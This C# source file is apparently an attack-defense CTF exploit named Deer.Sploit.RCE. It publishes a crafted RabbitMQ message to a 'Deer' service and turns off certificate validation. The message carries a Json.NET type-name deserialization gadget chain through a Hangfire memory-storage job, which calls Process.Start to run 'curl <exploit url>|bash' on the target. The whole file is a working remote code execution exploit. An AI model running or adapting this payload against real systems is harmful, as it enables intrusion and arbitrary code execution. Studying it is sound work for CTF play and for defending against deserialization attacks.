using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Text;
using EasyNetQ;
using EasyNetQ.Topology;
using Hangfire.MemoryStorage.Dto;
using Hangfire.Storage.Monitoring;
using Newtonsoft.Json;
using ServerDto = Hangfire.MemoryStorage.Dto.ServerDto;

namespace Deer.Sploit.RCE
{
    public class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length != 4)
            {
                Console.Error.WriteLine("Usage: Deer.Sploit.RCE.dll <host> <user> <password> <exploit url>");
                return;
            }

            var host = args[0];
            var user = args[1];
            var password = args[2];
            var exploitUrl = args[3];
            var logExchangeName = $"logs.{user}";

            var config = new ConnectionConfiguration
            {
                Hosts = new[] {new HostConfiguration {Host = host}},
                UserName = user,
                Password = password,
                Port = 5672,
                Ssl = {Enabled = true, CertificateValidationCallback = (sender, certificate, chain, errors) => true}
            };

            using (var bus = RabbitHutch.CreateBus(config, sr => { }))
            {
                var exchange = bus.Advanced.ExchangeDeclare(logExchangeName, ExchangeType.Fanout, passive: true);

                var properties = new MessageProperties{Type = "Deer.Models.Elasticsearch.SafeJsonDeserializer`1[[Deer.Hangfire.HangfireJobServer, Deer]], Deer"};
                var body = Encoding.UTF8.GetBytes(BuildJson(exploitUrl));

                bus.Advanced.Publish(exchange, "", false, properties, body);
            }
        }

        private static string BuildJson(string exploitUrl)
        {
            var serverDto = new ServerDto
            {
                Data = "{\"WorkerCount\":20,\"Queues\":[\"default\"],\"StartedAt\":\"2019-08-15T06:09:52.769184Z\"}",
                LastHeartbeat = DateTime.UtcNow,
                Id = "de525862-7588-4a31-9387-26177fb4cab6"
            };
            var jobId = "2f2b3701-c692-476a-b8ca-c45d117b9225";
            var jobQueueId = 1;
            var jobQueueDto = new JobQueueDto
            {
                JobId = jobId,
                Queue = "default",
                AddedAt = DateTime.UtcNow.AddMinutes(-1),
                FetchedAt = null,
                Id = jobQueueId
            };
            
            var jobDto = new JobDto
            {
                State = new StateDto
                {
                    JobId = jobId,
                    Name = "Enqueued",
                    CreatedAt = DateTime.UtcNow,
                    Data = "{\"EnqueuedAt\":\"2019-08-15T06:09:52.7600490Z\",\"Queue\":\"default\"}",
                    Id = jobQueueId
                },
                InvocationData = "{\"Type\":\"System.Diagnostics.Process, System.Diagnostics.Process, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Method\":\"Start\",\"ParameterTypes\":\"[\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\",\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\"]\"}",
                Arguments = $"[\"\\\"/bin/bash\\\"\",\"\\\"-c \\\\\\\"curl {exploitUrl}|bash\\\\\\\"\\\"\"]",
                CreatedAt = DateTime.UtcNow,
                Id = jobId,
                History = new List<StateHistoryDto>(),
                Parameters = new List<JobParameterDto>()
                {
                    new JobParameterDto
                    {
                        Id = 1,
                        Name = "CurrentCulture",
                        Value = "\"en-US\"",
                        JobId = jobId
                    },
                    new JobParameterDto
                    {
                        Id = 2,
                        Name = "CurrentUICulture",
                        Value = "\"en-US\"",
                        JobId = jobId
                    }
                }
            };
            
            var dataDict = new ConcurrentDictionary<Type, ConcurrentDictionary<object, object>>();
            dataDict[typeof(ListDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(CounterDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(AggregatedCounterDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(HashDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(SetDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(ServerDto)] = new ConcurrentDictionary<object, object>(new Dictionary<object, object> {{serverDto.Id, serverDto}});
            dataDict[typeof(JobQueueDto)] = new ConcurrentDictionary<object, object>(new Dictionary<object, object>{{jobQueueDto.Id.ToString(), jobQueueDto}});
            dataDict[typeof(JobDto)] = new ConcurrentDictionary<object, object>(new Dictionary<object, object> {{jobDto.Id, jobDto}});
            
            var dataJson = $"{{\"Dictionary\" : {JsonConvert.SerializeObject(dataDict, new JsonSerializerSettings{TypeNameHandling = TypeNameHandling.Auto})}}}";
            var memoryStorageJson = $"{{\"$type\":\"Hangfire.MemoryStorage.MemoryStorage, Hangfire.MemoryStorage\", \"Data\" : {dataJson}}}";

            var hangfireJobServerJson = $"{{\"$type\":\"Deer.Hangfire.HangfireJobServer, Deer\", \"storage\" : {memoryStorageJson}}}";

            var contractResolverJson = "{\"$type\":\"Newtonsoft.Json.Serialization.DefaultContractResolver, Newtonsoft.Json\", \"DefaultMembersSearchFlags\" : 52}";
            var jsonSerializerSettingsJson = $"{{\"$type\":\"Newtonsoft.Json.JsonSerializerSettings, Newtonsoft.Json\", \"TypeNameHandling\":4, \"ContractResolver\":{contractResolverJson}}}";
            
            return $"{{\"$type\":\"Deer.Models.Elasticsearch.SafeJsonDeserializer`1[[Deer.Hangfire.HangfireJobServer, Deer]], Deer\", \"json\": {JsonConvert.ToString(hangfireJobServerJson)}, \"settings\":{jsonSerializerSettingsJson}}}";
        }
    }
}
